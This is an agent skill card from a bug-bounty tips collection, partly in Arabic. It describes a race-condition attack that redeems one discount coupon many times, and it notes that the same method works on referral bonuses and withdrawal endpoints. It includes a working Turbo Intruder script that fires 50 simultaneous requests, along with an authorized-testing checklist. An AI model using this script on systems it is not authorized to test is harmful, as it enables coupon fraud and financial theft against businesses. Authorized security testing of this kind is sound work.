# SKILL: Race Condition Attack — استخدام كوبون أكتر من مرة بالتوازي

**Skill id:** `tip/race-condition-attack-استخدام-كوبون-أكتر-من-مرة-بالتوازي`  
**Category:** General  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dddac31e880813ca3a5f7ffbbaaefd2  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **General**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

لو الأبلكيشن مش بيتحقق من الـ concurrent requests عند validate كوبون الخصم، ابعت عشرات الطلبات متزامنة بنفس الكوبون قبل ما السيستم يعمل mark له إنه اتستخدم. نفس التقنية شاملة لأي hemi race condition زي referral bonus أو withdrawal endpoint.

## Payload / Code

```
Turbo Intruder script:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20, requestsPerConnection=100, pipeline=False)
    for i in range(50):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

(أو استخدم Burp Repeater > Send in parallel)
```

## Source

Intigriti Official 2026 (Tip 21) + Redfox Security 2026

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
